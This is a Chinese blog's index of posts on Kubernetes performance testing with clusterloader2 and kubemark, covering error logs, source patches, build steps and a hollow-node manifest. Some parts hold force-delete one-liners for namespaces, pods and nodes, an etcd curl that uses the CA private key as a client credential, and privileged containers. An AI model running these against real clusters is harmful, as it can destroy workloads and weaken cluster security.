TestOverridesPath:[] PrometheusConfig:{EnableServer:false TearDownServer:true ScrapeEtcd:false ScrapeNodeExporter:false ScrapeKubelets:false ScrapeKubeProxy:true SnapshotProject:}} I1211 11:10:31.311334 118141 cluster.go:56] Listing cluster nodes: I1211 11:10:31.311348 118141 cluster.go:68] Name: node1, clusterIP: 192.168.182.101, externalIP: , isSchedulable: true I1211 11:10:31.311354 118141 cluster.go:68] Name: node2, clusterIP: 192.168.182.102, externalIP: , isSchedulable: true I1211 11:10:31.314575 118141 clusterloader.go:167] -------------------------------------------------------------------------------- I1211 11:10:31.314588 118141 clusterloader.go:168] Running /home/wangb/perf-test/clusterloader2/testing/density/config.yaml I1211 11:10:31.314591 118141 clusterloader.go:169] -------------------------------------------------------------------------------- ","date":"2020-12-15","objectID":"/posts/2020/12/k8s%E9%9B%86%E7%BE%A4%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95-clusterloader/:6:1","tags":["K8S"],"title":"K8S集群性能测试-clusterloader","uri":"/posts/2020/12/k8s%E9%9B%86%E7%BE%A4%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95-clusterloader/"},{"categories":["K8S"],"content":"2. Errors: [measurement call TestMetrics - TestMetrics error: [unexpected error (code: 0) in ssh connection to master: \u0026errors.errorString{s:“error getting signer for provider : ‘GetSigner(…) not implemented for ‘\"}] 测试配置了TestMetrics measurement，但是没有通过。 ssh问题，参数不正确，还需要自定义环境变量配置KUBE_SSH_KEY_PATH=/root/.ssh/id_rsa E1211 11:34:39.085551 19551 test_metrics.go:185] TestMetrics: [unexpected error (code: 0) in ssh connection to master: \u0026errors.errorString{s:\"error getting signer for provider : 'GetSigner(...) not implemented for '\"} unexpected error (code: 0) in ssh connection to master: \u0026errors.errorString{s:\"error getting signer for provider : 'GetSigner(...) not implemented for '\"}] I1211 11:34:49.103215 19551 simple_test_executor.go:345] Resources cleanup time: 10.017395168s E1211 11:34:49.103273 19551 clusterloader.go:177] -------------------------------------------------------------------------------- E1211 11:34:49.103291 19551 clusterloader.go:178] Test Finished E1211 11:34:49.103295 19551 clusterloader.go:179] Test: /home/wangb/perf-test/clusterloader2/testing/density/config.yaml E1211 11:34:49.103298 19551 clusterloader.go:180] Status: Fail E1211 11:34:49.103301 19551 clusterloader.go:182] Errors: [measurement call TestMetrics - TestMetrics error: [unexpected error (code: 0) in ssh connection to master: \u0026errors.errorString{s:\"error getting signer for provider : 'GetSigner(...) not implemented for '\"}] measurement call APIResponsiveness - APIResponsiveness error: top latency metric: there should be no high-latency requests, but: [got: {Resource:endpoints Subresource: Verb:GET Scope:namespace Latency:{Perc50:1.046ms Perc90:4.871ms Perc99:1.588679s} Count:33}; expected perc99 \u003c= 1s] measurement call TestMetrics - TestMetrics error: [unexpected error (code: 0) in ssh connection to master: \u0026errors.errorString{s:\"error getting signer for provider : 'GetSigner(...) not implemented for '\"} unexpected error (code: 0) in ssh connection to master: \u0026errors.errorString{s:\"error getting signer for provider : 'GetSigner(...) not implemented for '\"}]] E1211 11:34:49.103310 19551 clusterloader.go:184] -------------------------------------------------------------------------------- F1211 11:34:49.106925 19551 clusterloader.go:276] 1 tests have failed! ","date":"2020-12-15","objectID":"/posts/2020/12/k8s%E9%9B%86%E7%BE%A4%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95-clusterloader/:6:2","tags":["K8S"],"title":"K8S集群性能测试-clusterloader","uri":"/posts/2020/12/k8s%E9%9B%86%E7%BE%A4%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95-clusterloader/"},{"categories":["K8S"],"content":"3. 告警提示：Master node is not registered. Grabbing metrics from Scheduler, ControllerManager and ClusterAutoscaler is disabled. W1214 10:00:44.212402 40729 metrics_grabber.go:81] Master node is not registered. Grabbing metrics from Scheduler, ControllerManager and ClusterAutoscaler is disabled. I1214 10:00:44.268795 40729 resource_usage.go:124] ResourceUsageSummary: gathering resource usage... I1214 10:00:44.268822 40729 container_resource_gatherer.go:172] Closed stop channel. Waiting for 0 workers I1214 10:00:44.268851 40729 container_resource_gatherer.go:180] Waitgroup finished. I1214 10:00:44.268935 40729 system_pod_metrics.go:82] skipping collection of system pod metrics E1214 10:00:44.268946 40729 test_metrics.go:185] TestMetrics: [text format parsing error in line 1: invalid metric name] I1214 10:00:54.301192 40729 simple_test_executor.go:345] Resources cleanup time: 10.031663914s E1214 10:00:54.301219 40729 clusterloader.go:177] -------------------------------------------------------------------------------- E1214 10:00:54.301222 40729 clusterloader.go:178] Test Finished E1214 10:00:54.301225 40729 clusterloader.go:179] Test: /home/wangb/perf-test/clusterloader2/testing/density/config2.yaml E1214 10:00:54.301227 40729 clusterloader.go:180] Status: Fail E1214 10:00:54.301229 40729 clusterloader.go:182] Errors: [measurement call TestMetrics - TestMetrics error: [text format parsing error in line 1: invalid metric name]] E1214 10:00:54.301233 40729 clusterloader.go:184] -------------------------------------------------------------------------------- F1214 10:00:54.305222 40729 clusterloader.go:276] 1 tests have failed! 排查过程，结合分析源码： 如果没有注册master节点，则测试不会统计调度器和controllers等组件信息 分处理逻辑，发现clusterloader2对master节点的判断条件不符合测试集群环境，如下。需要修改下clusterloader2的代码 // TODO: find a better way of figuring out if given node is a registered master. func IsMasterNode(nodeName string) bool { // We are trying to capture \"master(-...)?$\" regexp. // However, using regexp.MatchString() results even in more than 35% // of all space allocations in ControllerManager spent in this function. // That's why we are trying to be a bit smarter. if strings.HasSuffix(nodeName, \"master\") { return true } if len(nodeName) \u003e= 10 { return strings.HasSuffix(nodeName[:len(nodeName)-3], \"master-\") } return false } 原有代码程序对master节点判断逻辑为：nodename为master或者master-开头 修改代码：在system.IsMasterNode(node.Name) 引用处，新增条件： node.Labels[“node-role.kubernetes.io/master”] == “true” ，作为master节点判断 ","date":"2020-12-15","objectID":"/posts/2020/12/k8s%E9%9B%86%E7%BE%A4%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95-clusterloader/:6:3","tags":["K8S"],"title":"K8S集群性能测试-clusterloader","uri":"/posts/2020/12/k8s%E9%9B%86%E7%BE%A4%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95-clusterloader/"},{"categories":["K8S"],"content":"4. EtcdMetrics信息获取不到：EtcdMetrics: failed to collect etcd database size E1214 11:06:03.936128 2312 etcd_metrics.go:121] EtcdMetrics: failed to collect etcd database size 或者上报错误：TestMetrics: [text format parsing error in line 1: invalid metric name] E1211 11:42:36.545827 30129 test_metrics.go:185] TestMetrics: [text format parsing error in line 1: invalid metric name] https://github.com/kubernetes/perf-tests/issues/875 提的问题没有人解答 最初先把testMetic测试项关闭，暂时规避该问题。可能跟metric服务数据采集有关。后来排查了下日志打印信息，发现有多处报错，要逐个排查。 分析源码应该是获取不到etcd的metrics导致，修改代码如下： measurement/common/simple/etcd_metrics func (e *etcdMetricsMeasurement) getEtcdMetrics(host, provider string) ([]*model.Sample, error) { // Etcd is only exposed on localhost level. We are using ssh method if provider == \"gke\" { klog.Infof(\"%s: not grabbing etcd metrics through master SSH: unsupported for gke\", e) return nil, nil } // In https://github.com/kubernetes/kubernetes/pull/74690, mTLS is enabled for etcd server // http://localhost:2382 is specified to bypass TLS credential requirement when checking // etcd /metrics and /health. //if samples, err := e.sshEtcdMetrics(\"curl http://localhost:2382/metrics\", host, provider); err == nil { // return samples, nil //} // fix: 问题错误信息：EtcdMetrics: failed to collect etcd database size // 这里需要根据实际测试环境情况，进行硬编码配置。 add by wangb // 先ssh，再执行metrics的cmd if samples, err := e.sshEtcdMetrics(\"curl https://localhost:2379/metrics -k --cert /etc/ssl/etcd/ssl/ca.pem --key /etc/ssl/etcd/ssl/ca-key.pem\", host, provider); err == nil { return samples, nil } // Use old endpoint if new one fails. return e.sshEtcdMetrics(\"curl http://localhost:2379/metrics\", host, provider) } 按上述修改后，再重新编译，问题解决 ","date":"2020-12-15","objectID":"/posts/2020/12/k8s%E9%9B%86%E7%BE%A4%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95-clusterloader/:6:4","tags":["K8S"],"title":"K8S集群性能测试-clusterloader","uri":"/posts/2020/12/k8s%E9%9B%86%E7%BE%A4%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95-clusterloader/"},{"categories":["K8S"],"content":"5.报错找不到资源 TestMetrics: [the server could not find the requested resource (get pods kube-scheduler-192.168.182.101:10251)] I1214 14:14:20.039016 126597 resource_usage.go:124] ResourceUsageSummary: gathering resource usage... I1214 14:14:20.039058 126597 container_resource_gatherer.go:172] Closed stop channel. Waiting for 1 workers I1214 14:14:20.039075 126597 resource_gather_worker.go:90] Closing worker for node1 I1214 14:14:20.039082 126597 container_resource_gatherer.go:180] Waitgroup finished. I1214 14:14:20.039181 126597 system_pod_metrics.go:82] skipping collection of system pod metrics E1214 14:14:20.039193 126597 test_metrics.go:185] TestMetrics: [the server could not find the requested resource (get pods kube-scheduler-192.168.182.101:10251)] I1214 14:14:30.103890 126597 simple_test_executor.go:345] Resources cleanup time: 10.064213743s E1214 14:14:30.104163 126597 clusterloader.go:177] -------------------------------------------------------------------------------- E1214 14:14:30.104170 126597 clusterloader.go:178] Test Finished E1214 14:14:30.104173 126597 clusterloader.go:179] Test: /home/wangb/perf-test/clusterloader2/testing/density/config2.yaml E1214 14:14:30.104176 126597 clusterloader.go:180] Status: Fail E1214 14:14:30.104178 126597 clusterloader.go:182] Errors: [measurement call TestMetrics - TestMetrics error: [the server could not find the requested resource (delete pods kube-scheduler-192.168.182.101:10251)] measurement call TestMetrics - TestMetrics error: [the server could not find the requested resource (get pods kube-scheduler-192.168.182.101:10251)]] E1214 14:14:30.104180 126597 clusterloader.go:184] -------------------------------------------------------------------------------- F1214 14:14:30.104658 126597 clusterloader.go:276] 1 tests have failed! 分析可能是 view resource no match 查询资源url不正确导致？ 分析代码如下，可能是在msternode下构造request时有问题，定位原因为restclient构造url有问题。改用curl方式（可本地测试通过）直接获取调度器metrics common/simple/scheduler_latency.go // Sends request to kube scheduler metrics func (s *schedulerLatencyMeasurement) sendRequestToScheduler(c clientset.Interface, op, host, provider, masterName string) (string, error) { opUpper := strings.ToUpper(op) if opUpper != \"GET\" \u0026\u0026 opUpper != \"DELETE\" { return \"\", fmt.Errorf(\"unknown REST request\") } nodes, err := c.CoreV1().Nodes().List(metav1.ListOptions{}) if err != nil { return \"\", err } var masterRegistered = false for _, node := range nodes.Items { if node.Labels[\"node-role.kubernetes.io/master\"] == \"true\" || system.IsMasterNode(node.Name) { masterRegistered = true } } var responseText string // masterRegistered时，client接口处理有问题，统一改使用curl -X 方式处理GET和DELETE add by wangb start _ = masterRegistered //if masterRegistered { // ctx, cancel := context.WithTimeout(context.Background(), singleRestCallTimeout) // defer cancel() // // body, err := c.CoreV1().RESTClient().Verb(opUpper). // Context(ctx). // Namespace(metav1.NamespaceSystem). // Resource(\"pods\"). // Name(fmt.Sprintf(\"kube-scheduler-%v:%v\", masterName, ports.InsecureSchedulerPort)). // SubResource(\"proxy\"). // Suffix(\"metrics\"). // Do().Raw() // // if err != nil { // return \"\", err // } // responseText = string(body) //} else { // // If master is not registered fall back to old method of using SSH. // if provider == \"gke\" { // klog.Infof(\"%s: not grabbing scheduler metrics through master SSH: unsupported for gke\", s) // return \"\", nil // } // // cmd := \"curl -X \" + opUpper + \" http://localhost:10251/metrics\" // sshResult, err := measurementutil.SSH(cmd, host+\":22\", provider) // if err != nil || sshResult.Code != 0 { // return \"\", fmt.Errorf(\"unexpected error (code: %d) in ssh connection to master: %#v\", sshResult.Code, err) // } // responseText = sshResult.Stdout //} // curl http://localhost:10251/metrics 这个命令测试可用 cmd := \"curl -X \" + opUpper + \" http://localhost:10251/metrics\" sshResult, err := measurementutil.SSH(cmd, host+\":22\", provider) if err != nil || sshResult.Code != 0 { return \"\", fmt.Errorf(\"unexpected error (code: %d)","date":"2020-12-15","objectID":"/posts/2020/12/k8s%E9%9B%86%E7%BE%A4%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95-clusterloader/:6:5","tags":["K8S"],"title":"K8S集群性能测试-clusterloader","uri":"/posts/2020/12/k8s%E9%9B%86%E7%BE%A4%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95-clusterloader/"},{"categories":["K8S"],"content":"6. 测试结果指标异常输出 不是问题，这是测试工具成功生效，并返回提示断言信息 I1214 15:25:56.117594 96634 wait_for_controlled_pods.go:235] WaitForControlledPodsRunning: running 0, deleted 2, timeout: 0, unknown: 0 I1214 15:25:56.117625 96634 wait_for_controlled_pods.go:249] WaitForControlledPodsRunning: 0/0 ReplicationControllers are running with all pods I1214 15:25:56.124212 96634 simple_test_executor.go:128] Step \"Deleting saturation pods\" ended I1214 15:25:56.245924 96634 api_responsiveness.go:119] APIResponsiveness: WARNING Top latency metric: {Resource:endpoints Subresource: Verb:PUT Scope:namespace Latency:{Perc50:2.65ms Perc90:22.594ms Perc99:1.122221s} Count:22}; threshold: 1s I1214 15:25:56.245949 96634 api_responsiveness.go:119] APIResponsiveness: WARNING Top latency metric: {Resource:namespaces Subresource: Verb:GET Scope:cluster Latency:{Perc50:11.99ms Perc90:1.005472s Perc99:1.084129s} Count:13}; threshold: 1s I1214 15:25:56.245957 96634 api_responsiveness.go:119] APIResponsiveness: WARNING Top latency metric: {Resource:nodes Subresource:status Verb:PATCH Scope:cluster Latency:{Perc50:1.00345s Perc90:1.00345s Perc99:1.00345s} Count:1}; threshold: 1s I1214 15:25:56.245962 96634 api_responsiveness.go:119] APIResponsiveness: Top latency metric: {Resource:pods Subresource:status Verb:PATCH Scope:namespace Latency:{Perc50:3.777ms Perc90:13.656ms Perc99:173.072ms} Count:88}; threshold: 1s I1214 15:25:56.245966 96634 api_responsiveness.go:119] APIResponsiveness: Top latency metric: {Resource:pods Subresource: Verb:GET Scope:namespace Latency:{Perc50:1.88ms Perc90:11.522ms Perc99:87.668ms} Count:156}; threshold: 1s I1214 15:25:56.821263 96634 resource_usage.go:124] ResourceUsageSummary: gathering resource usage... I1214 15:25:56.823909 96634 container_resource_gatherer.go:172] Closed stop channel. Waiting for 1 workers I1214 15:25:56.824075 96634 resource_gather_worker.go:90] Closing worker for node1 I1214 15:25:56.824118 96634 container_resource_gatherer.go:180] Waitgroup finished. I1214 15:25:56.824313 96634 system_pod_metrics.go:82] skipping collection of system pod metrics I1214 15:26:06.865304 96634 simple_test_executor.go:345] Resources cleanup time: 10.040658542s E1214 15:26:06.865325 96634 clusterloader.go:177] -------------------------------------------------------------------------------- E1214 15:26:06.865328 96634 clusterloader.go:178] Test Finished E1214 15:26:06.865330 96634 clusterloader.go:179] Test: /home/wangb/perf-test/clusterloader2/testing/density/config2.yaml E1214 15:26:06.865335 96634 clusterloader.go:180] Status: Fail E1214 15:26:06.865338 96634 clusterloader.go:182] Errors: [measurement call APIResponsiveness - APIResponsiveness error: top latency metric: there should be no high-latency requests, but: [got: {Resource:endpoints Subresource: Verb:PUT Scope:namespace Latency:{Perc50:2.65ms Perc90:22.594ms Perc99:1.122221s} Count:22}; expected perc99 \u003c= 1s got: {Resource:namespaces Subresource: Verb:GET Scope:cluster Latency:{Perc50:11.99ms Perc90:1.005472s Perc99:1.084129s} Count:13}; expected perc99 \u003c= 1s got: {Resource:nodes Subresource:status Verb:PATCH Scope:cluster Latency:{Perc50:1.00345s Perc90:1.00345s Perc99:1.00345s} Count:1}; expected perc99 \u003c= 1s]] E1214 15:26:06.865341 96634 clusterloader.go:184] -------------------------------------------------------------------------------- F1214 15:26:06.866736 96634 clusterloader.go:276] 1 tests have failed! 由上看出，由于时延性能指标超过门限值1s，测试工具认为测试不通过。 修改下 测试配置文件中的PODS_PER_NODE参数，由10改为2，负载变小，则测试通过 I1214 15:35:53.874477 111782 wait_for_controlled_pods.go:235] WaitForControlledPodsRunning: running 0, deleted 2, timeout: 0, unknown: 0 I1214 15:35:53.874751 111782 wait_for_controlled_pods.go:249] WaitForControlledPodsRunning: 0/0 ReplicationControllers are running with all pods I1214 15:35:53.874765 111782 simple_test_executor.go:128] Step \"Deleting saturation pods\" ended I1214 15:35:53.956315 111782 api_responsiveness.go:119] APIResponsiveness: Top latency metric: {Resource:replicationcontrollers Su","date":"2020-12-15","objectID":"/posts/2020/12/k8s%E9%9B%86%E7%BE%A4%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95-clusterloader/:6:6","tags":["K8S"],"title":"K8S集群性能测试-clusterloader","uri":"/posts/2020/12/k8s%E9%9B%86%E7%BE%A4%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95-clusterloader/"},{"categories":["K8S"],"content":"7 总结 perf-test clusterloader2工具主要提供了性能压测，可配置性好，方便编写测试用例，并且统计了相应的性能指标 clusterloader2内置实现了k8s指标采集处理和指标阈值定义，参考文档：Kubernetes scalability and performance SLIs/SLOs clusterloader2没有详细的使用说明文档，目前来看不是可以拿来直接运行使用。所遇到问题一般只能依靠自己解决。 由于上面第3点，所遇问题较多，一般多涉及测试工具环境配置参数，另外clusterloader2对一些参数使用的是硬编码方式，导致无法直接使用原有工具，只能修改源码进行测试适配。 测试使用clusterloader2，需要详细了解其设计方案，才能运行测试用例 进行集群测试，需要了解集群测试指标定义，再编写测试配置 测试时需要预估下测试pod数量和内存占用情况，否则会引起OOM。 clusterloader2并不是一个拿来即用的测试工具，还需结合测试环境进行改造适配，更像是K8S内部使用的类似脚手架的东西 ","date":"2020-12-15","objectID":"/posts/2020/12/k8s%E9%9B%86%E7%BE%A4%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95-clusterloader/:7:0","tags":["K8S"],"title":"K8S集群性能测试-clusterloader","uri":"/posts/2020/12/k8s%E9%9B%86%E7%BE%A4%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95-clusterloader/"},{"categories":["K8S"],"content":"8 附录 参考命令 批量删除k8s测试命名空间及其资源，这里测试数据默认使用了test-开头的命令规则 kubectl get ns |grep test- |awk '{print $1}' |xargs kubectl delete ns --force --grace-period=0 测试中如果出现异常，系统会残留有测试使用的资源参数，这里需要对实际情况进行调整 测试完成后的测试资源清理（如果测试后有测试数据资源残留的话）： 测试ns、rc、pod清理 hollow-node 桩节点清理 K8S的SLI (服务等级指标) 和 SLO (服务等级目标) Kubernetes 社区提供了 SLI (服务等级指标) 和 SLO (服务等级目标) 系统性能测试、分析文档 Kubernetes scalability and performance SLIs/SLOs。模拟出一个 K8s cluster（Kubemark cluster），不受资源限制。cluster 中 master 是真实的机器，所有的 nodes 是 Hollow nodes。Hollow nodes 不会调用Docker，测试一套 K8s API 调用的完整流程，不会真正创建 pod。 社区开发了 perf-test/clusterloader2，可配置性好，并且统计了相应的性能指标 kubemark 不调用 CRI 接口之外，其它行为和 kubelet 基本一致 ","date":"2020-12-15","objectID":"/posts/2020/12/k8s%E9%9B%86%E7%BE%A4%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95-clusterloader/:8:0","tags":["K8S"],"title":"K8S集群性能测试-clusterloader","uri":"/posts/2020/12/k8s%E9%9B%86%E7%BE%A4%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95-clusterloader/"},{"categories":["K8S"],"content":"Etcd监控指标 参考: https://github.com/coreos/etcd/blob/master/Documentation/metrics.md 领导者相关 etcd_server_has_leader etcd是否有leader etcd_server_leader_changes_seen_total etcd的leader变换次数 etcd_debugging_mvcc_db_total_size_in_bytes 数据库的大小 process_resident_memory_bytes 进程驻留内存 网络相关 grpc_server_started_total grpc(高性能、开源的通用RPC(远程过程调用)框架)服务器启动总数 etcd_network_client_grpc_received_bytes_total 接收到grpc客户端的字节总数 etcd_network_client_grpc_sent_bytes_total 发送给grpc客户端的字节总数 etcd_network_peer_received_bytes_total etcd网络对等方接收的字节总数(对等网络，即对等计算机网络，是一种在对等者（Peer）之间分配任务和工作负载的分布式应用架构，是对等计算模型在应用层形成的一种组网或网络形式) etcd_network_peer_sent_bytes_total etcd网络对等方发送的字节总数 提案相关 etcd_server_proposals_failed_total 目前正在处理的提案(提交会议讨论决定的建议。)数量 etcd_server_proposals_pending 失败提案总数 etcd_server_proposals_committed_total 已落实共识提案的总数。 etcd_server_proposals_applied_total 已应用的共识提案总数。 这些指标描述了磁盘操作的状态。 etcd_disk_backend_commit_duration_seconds_sum etcd磁盘后端提交持续时间秒数总和 etcd_disk_backend_commit_duration_seconds_bucket etcd磁盘后端提交持续时间 快照 etcd_debugging_snap_save_total_duration_seconds_sum etcd快照保存用时 文件 process_open_fds{service=“etcd-k8s”} 打开文件描述符的数量 process_max_fds{service=“etcd-k8s”} 打开文件描述符的最大数量 etcd_disk_wal_fsync_duration_seconds_sum Wal(预写日志系统)调用的fsync(将文件数据同步到硬盘)的延迟分布 etcd_disk_wal_fsync_duration_seconds_bucket 后端调用的提交的延迟分布 参考文章 Kubernetes测试系列 - 性能测试 kubernetes性能指标体系：clusterloader2 clusterloader2的漫漫踩坑路：最详细解析与使用指南 clusterloader2设计说明：Cluster loader vision etcd指标监控，参考文章 ","date":"2020-12-15","objectID":"/posts/2020/12/k8s%E9%9B%86%E7%BE%A4%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95-clusterloader/:8:1","tags":["K8S"],"title":"K8S集群性能测试-clusterloader","uri":"/posts/2020/12/k8s%E9%9B%86%E7%BE%A4%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95-clusterloader/"},{"categories":["K8S"],"content":"了解如何使用kubemark对k8s组件进行性能测试","date":"2020-12-08","objectID":"/posts/2020/12/k8s%E9%9B%86%E7%BE%A4%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95-kubemark/","tags":["K8S"],"title":"K8S集群性能测试-kubemark","uri":"/posts/2020/12/k8s%E9%9B%86%E7%BE%A4%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95-kubemark/"},{"categories":["K8S"],"content":"了解如何使用kubemark对k8s组件进行性能测试 ","date":"2020-12-08","objectID":"/posts/2020/12/k8s%E9%9B%86%E7%BE%A4%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95-kubemark/:0:0","tags":["K8S"],"title":"K8S集群性能测试-kubemark","uri":"/posts/2020/12/k8s%E9%9B%86%E7%BE%A4%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95-kubemark/"},{"categories":["K8S"],"content":"1 背景 项目想对k8s组件进行集群性能测试。原有组件如调度器，已有的测试工具多是单元测试。需要寻找一种可以对k8s集群进行性能测试。比如多多节点大集群规模下的调度器性能指标如何？ 考虑使用k8s项目自带的性能测试组件kubemark。 ","date":"2020-12-08","objectID":"/posts/2020/12/k8s%E9%9B%86%E7%BE%A4%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95-kubemark/:1:0","tags":["K8S"],"title":"K8S集群性能测试-kubemark","uri":"/posts/2020/12/k8s%E9%9B%86%E7%BE%A4%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95-kubemark/"},{"categories":["K8S"],"content":"2 kubemark ","date":"2020-12-08","objectID":"/posts/2020/12/k8s%E9%9B%86%E7%BE%A4%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95-kubemark/:2:0","tags":["K8S"],"title":"K8S集群性能测试-kubemark","uri":"/posts/2020/12/k8s%E9%9B%86%E7%BE%A4%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95-kubemark/"},{"categories":["K8S"],"content":"介绍 kubemark 是 K8s 官方给出的性能测试工具，能够不受任何资源限制，模拟出一个大规模 K8s 集群。其主要架构如图所示:需要一个外部 K8s 集群（external cluster） 以及一个机器节点运行 kubemark master，即另外一个 K8s 集群，但是只有一个 master 节点。我们需要在 external cluster 中部署运行 hollow pod，这些 pod 会主动向 kubemark 集群注册，并成为 kubemark 集群中的 hollow node(虚拟节点)。然后我们就可以在 kubemark 集群中进行 e2e 测试。虽然与真实集群的稍微有点误差，不过可以代表真实集群的数据。 本文则只构造了kubemark组件，且只使用了测试集群，即外部 K8s 集群（external cluster），未使用第2个kubemark集群。目的为测试集群中的master组件，如调度器和控制器等。另外，此方式还可以自己使用第三方测试工具和框架 ","date":"2020-12-08","objectID":"/posts/2020/12/k8s%E9%9B%86%E7%BE%A4%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95-kubemark/:2:1","tags":["K8S"],"title":"K8S集群性能测试-kubemark","uri":"/posts/2020/12/k8s%E9%9B%86%E7%BE%A4%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95-kubemark/"},{"categories":["K8S"],"content":"kubemark构造 1. 编译kubemark 在 K8s 源码路径下构建 kubemark，生成的二进制文件在 _output/bin 目录下。 # KUBE_BUILD_PLATFORMS=linux/amd64 make kubemark GOFLAGS=-v GOGCFLAGS=\"-N -l\" make kubemark GOGCFLAGS=\"-N -l\" 2. 构建kubemark镜像 将生成的 kubemark 二进制文件从 _output/bin 复制到 cluster/images/kubemark 目录下。 cp _output/bin/kubemark cluster/images/kubemark/ 并在该目录下执行构建镜像命令，生成镜像：staging-registry.cn-hangzhou.aliyuncs.com/google_containers/kubemark:v1.14.8。 # IMAGE_TAG=v1.14.3 make build cd cluster/images/kubemark/ IMAGE_TAG=v1.14.8 make build 3. 保存镜像至kubemark.tar 4. kubemark部署到测试集群 在测试集群中的所有node节点中，导入该kubemark镜像。用于启动桩节点。 接下来进行桩节点hollow-node启动配置操作 # 以下命令在测试集群的master节点上执行 # 从kubemark-master节点（191节点）拷贝过来kubeconfig文件，到测试集群的master节点中 # scp -r 192.168.182.191:/root/.kube/config /home/wangb/ # 在测试集群master节点上执行 kubectl create ns kubemark kubectl create configmap node-configmap -n kubemark --from-literal=content.type=\"test-cluster\" # kubectl create secret generic kubeconfig --type=Opaque --namespace=kubemark --from-file=kubelet.kubeconfig=config --from-file=kubeproxy.kubeconfig=config kubectl create secret generic kubeconfig --type=Opaque --namespace=kubemark --from-file=kubelet.kubeconfig=/root/.kube/config --from-file=kubeproxy.kubeconfig=/root/.kube/config 5. 在测试集群中启动hollow nodes kubectl create -f hollow-node-sts.yaml -n kubemark ","date":"2020-12-08","objectID":"/posts/2020/12/k8s%E9%9B%86%E7%BE%A4%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95-kubemark/:2:2","tags":["K8S"],"title":"K8S集群性能测试-kubemark","uri":"/posts/2020/12/k8s%E9%9B%86%E7%BE%A4%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95-kubemark/"},{"categories":["K8S"],"content":"清理kubemark 资源 # delete hollow-node-sts kubectl delete -f hollow-node-sts.yaml NAMESPACE=kubemark kubectl get po -n $NAMESPACE |grep -E \"Terminating|CrashLoopBackOff|Error\" |awk '{print $1}' |xargs kubectl delete pod -n $NAMESPACE --force --grace-period=0 NAMESPACE=kube-system kubectl get po -n $NAMESPACE |grep -E \"ContainerCreating|Init:0/1|Pending\" |grep -v \"metrics-server\"|awk '{print $1}' |xargs kubectl delete pod -n $NAMESPACE --force --grace-period=0 NAMESPACE=aistation kubectl get po -n $NAMESPACE |grep -E \"ContainerCreating|Init:0/1|Pending\" |awk '{print $1}' |xargs kubectl delete pod -n $NAMESPACE --force --grace-period=0 #NAMESPACE=kubemark #kubectl delete ns $NAMESPACE --force --grace-period=0 # clear nodes kubectl get no |grep \"hollow-node\" |awk '{print $1}' |xargs kubectl delete no --force --grace-period=0 ","date":"2020-12-08","objectID":"/posts/2020/12/k8s%E9%9B%86%E7%BE%A4%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95-kubemark/:2:3","tags":["K8S"],"title":"K8S集群性能测试-kubemark","uri":"/posts/2020/12/k8s%E9%9B%86%E7%BE%A4%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95-kubemark/"},{"categories":["K8S"],"content":"测试pod 启动桩节点，hollow-node-sts.yaml的默认配置如下： apiVersion:v1kind:Servicemetadata:name:hollow-nodenamespace:kubemarkspec:clusterIP:Noneports:- port:80protocol:TCPtargetPort:80selector:name:hollow-node---apiVersion:apps/v1kind:StatefulSetmetadata:name:hollow-nodenamespace:kubemarkspec:podManagementPolicy:Parallelreplicas:6selector:matchLabels:name:hollow-nodeserviceName:hollow-nodetemplate:metadata:labels:name:hollow-nodespec:initContainers:- name:init-inotify-limitimage:docker.io/busybox:latestimagePullPolicy:IfNotPresentcommand:['sysctl','-w','fs.inotify.max_user_instances=200']securityContext:privileged:truevolumes:- name:kubeconfig-volumesecret:secretName:kubeconfig- name:logs-volumehostPath:path:/var/logcontainers:- name:hollow-kubeletimage:staging-registry.cn-hangzhou.aliyuncs.com/google_containers/kubemark:v1.14.8imagePullPolicy:IfNotPresentports:- containerPort:4194- containerPort:10250- containerPort:10255env:- name:CONTENT_TYPEvalueFrom:configMapKeyRef:name:node-configmapkey:content.type- name:NODE_NAMEvalueFrom:fieldRef:fieldPath:metadata.namecommand:- /bin/sh- -c- /kubemark --morph=kubelet --name=$(NODE_NAME) --kubeconfig=/kubeconfig/kubelet.kubeconfig $(CONTENT_TYPE) --alsologtostderr --v=2volumeMounts:- name:kubeconfig-volumemountPath:/kubeconfigreadOnly:true- name:logs-volumemountPath:/var/logresources:requests:cpu:20mmemory:50MsecurityContext:privileged:true- name:hollow-proxyimage:staging-registry.cn-hangzhou.aliyuncs.com/google_containers/kubemark:v1.14.8imagePullPolicy:IfNotPresentenv:- name:CONTENT_TYPEvalueFrom:configMapKeyRef:name:node-configmapkey:content.type- name:NODE_NAMEvalueFrom:fieldRef:fieldPath:metadata.namecommand:- /bin/sh- -c- /kubemark --morph=proxy --name=$(NODE_NAME) --use-real-proxier=false --kubeconfig=/kubeconfig/kubeproxy.kubeconfig $(CONTENT_TYPE) --alsologtostderr --v=2volumeMounts:- name:kubeconfig-volumemountPath:/kubeconfigreadOnly:true- 